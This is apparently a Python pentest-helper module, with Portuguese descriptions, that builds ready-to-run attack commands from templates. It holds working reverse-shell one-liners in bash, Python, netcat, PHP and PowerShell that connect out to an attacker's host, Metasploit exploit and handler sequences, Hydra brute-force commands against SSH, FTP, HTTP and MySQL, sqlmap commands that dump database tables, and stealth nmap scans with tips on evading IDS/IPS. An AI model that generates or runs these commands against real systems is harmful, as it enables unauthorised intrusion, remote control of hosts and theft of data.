class CommandGenerator:
    def __init__(self):
        self.nmap_templates = {
            "quick_scan": "nmap -T4 -F {target}",
            "full_scan": "nmap -T4 -A -v {target}",
            "stealth_scan": "nmap -sS -T2 {target}",
            "udp_scan": "nmap -sU -T4 {target}",
            "version_detection": "nmap -sV -sC {target}",
            "os_detection": "nmap -O {target}",
            "vuln_scan": "nmap --script vuln {target}",
            "all_ports": "nmap -p- -T4 {target}"
        }
        
        self.metasploit_templates = {
            "msfconsole": "msfconsole -q",
            "search_exploit": "search {service}",
            "use_exploit": "use {exploit_path}",
            "set_target": "set RHOSTS {target}",
            "set_payload": "set PAYLOAD {payload}",
            "exploit": "exploit -j",
            "reverse_shell": "use exploit/multi/handler\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\nexploit"
        }
        
        self.shell_templates = {
            "bash_reverse": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python_reverse": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "netcat_reverse": "nc -e /bin/sh {lhost} {lport}",
            "php_reverse": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "powershell_reverse": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
        }
        
        self.hydra_templates = {
            "ssh_brute": "hydra -l {username} -P {wordlist} {target} ssh",
            "ftp_brute": "hydra -l {username} -P {wordlist} {target} ftp",
            "http_brute": "hydra -l {username} -P {wordlist} {target} http-get /",
            "mysql_brute": "hydra -l {username} -P {wordlist} {target} mysql"
        }
        
        self.sqlmap_templates = {
            "basic": "sqlmap -u \"{url}\" --dbs",
            "with_cookie": "sqlmap -u \"{url}\" --cookie=\"{cookie}\" --dbs",
            "post_data": "sqlmap -u \"{url}\" --data=\"{data}\" --dbs",
            "dump_table": "sqlmap -u \"{url}\" -D {database} -T {table} --dump"
        }
    
    def generate_nmap(self, scan_type, target, **kwargs):
        if scan_type not in self.nmap_templates:
            return {"error": f"Tipo de scan não encontrado: {scan_type}"}
        
        command = self.nmap_templates[scan_type].format(target=target)
        
        return {
            "tool": "nmap",
            "scan_type": scan_type,
            "command": command,
            "description": self._get_nmap_description(scan_type),
            "tips": self._get_nmap_tips(scan_type)
        }
    
    def generate_metasploit(self, action, **kwargs):
        if action not in self.metasploit_templates:
            return {"error": f"Ação não encontrada: {action}"}
        
        command = self.metasploit_templates[action].format(**kwargs)
        
        return {
            "tool": "metasploit",
            "action": action,
            "command": command,
            "description": self._get_metasploit_description(action)
        }
    
    def generate_shell(self, shell_type, lhost, lport):
        if shell_type not in self.shell_templates:
            return {"error": f"Tipo de shell não encontrado: {shell_type}"}
        
        command = self.shell_templates[shell_type].format(lhost=lhost, lport=lport)
        
        return {
            "tool": "reverse_shell",
            "shell_type": shell_type,
            "command": command,
            "description": self._get_shell_description(shell_type),
            "listener": f"nc -lvnp {lport}" if "netcat" in shell_type else f"rlwrap nc -lvnp {lport}"
        }
    
    def generate_hydra(self, attack_type, target, username, wordlist):
        if attack_type not in self.hydra_templates:
            return {"error": f"Tipo de ataque não encontrado: {attack_type}"}
        
        command = self.hydra_templates[attack_type].format(
            target=target,
            username=username,
            wordlist=wordlist
        )
        
        return {
            "tool": "hydra",
            "attack_type": attack_type,
            "command": command,
            "description": self._get_hydra_description(attack_type)
        }
    
    def generate_sqlmap(self, attack_type, url, **kwargs):
        if attack_type not in self.sqlmap_templates:
            return {"error": f"Tipo de ataque não encontrado: {attack_type}"}
        
        command = self.sqlmap_templates[attack_type].format(url=url, **kwargs)
        
        return {
            "tool": "sqlmap",
            "attack_type": attack_type,
            "command": command,
            "description": self._get_sqlmap_description(attack_type)
        }
    
    def _get_nmap_description(self, scan_type):
        descriptions = {
            "quick_scan": "Scan rápido comTiming agressivo",
            "full_scan": "Scan completo com detecção de OS e versões",
            "stealth_scan": "Scan sigiloso usando SYN packets",
            "udp_scan": "Scan em portas UDP",
            "version_detection": "Detecção de versões de serviços",
            "os_detection": "Detecção do sistema operacional",
            "vuln_scan": "Scan de vulnerabilidades conhecidas",
            "all_ports": "Scan em todas as 65535 portas"
        }
        return descriptions.get(scan_type, "")
    
    def _get_nmap_tips(self, scan_type):
        tips = {
            "quick_scan": "Use para mapeamento inicial rápido",
            "full_scan": "Pode demorar bastante, use em ambiente controlado",
            "stealth_scan": "Menor chance de ser detectado por IDS/IPS",
            "udp_scan": "Mais lento que TCP scan, requer root/admin",
            "version_detection": "Útil para identificar alvos específicos",
            "os_detection": "Precisa de portas abertas para funcionar",
            "vuln_scan": "Use após identificar serviços para encontrar CVEs",
            "all_ports": "Demorado mas garante que nenhuma porta é perdida"
        }
        return tips.get(scan_type, "")
    
    def _get_metasploit_description(self, action):
        descriptions = {
            "msfconsole": "Iniciar console do Metasploit",
            "search_exploit": "Buscar exploits para um serviço",
            "use_exploit": "Selecionar um exploit específico",
            "set_target": "Configurar alvo do ataque",
            "set_payload": "Configurar payload a ser usado",
            "exploit": "Executar exploit selecionado",
            "reverse_shell": "Configurar listener para reverse shell"
        }
        return descriptions.get(action, "")
    
    def _get_shell_description(self, shell_type):
        descriptions = {
            "bash_reverse": "Shell reverso usando Bash",
            "python_reverse": "Shell reverso usando Python",
            "netcat_reverse": "Shell reverso usando Netcat",
            "php_reverse": "Shell reverso usando PHP",
            "powershell_reverse": "Shell reverso usando PowerShell (Windows)"
        }
        return descriptions.get(shell_type, "")
    
    def _get_hydra_description(self, attack_type):
        descriptions = {
            "ssh_brute": "Brute force em SSH",
            "ftp_brute": "Brute force em FTP",
            "http_brute": "Brute force em autenticação HTTP",
            "mysql_brute": "Brute force em MySQL"
        }
        return descriptions.get(attack_type, "")
    
    def _get_sqlmap_description(self, attack_type):
        descriptions = {
            "basic": "Teste básico de SQL injection",
            "with_cookie": "SQLi com autenticação via cookie",
            "post_data": "SQLi em requisições POST",
            "dump_table": "Extrair dados de tabela específica"
        }
        return descriptions.get(attack_type, "")
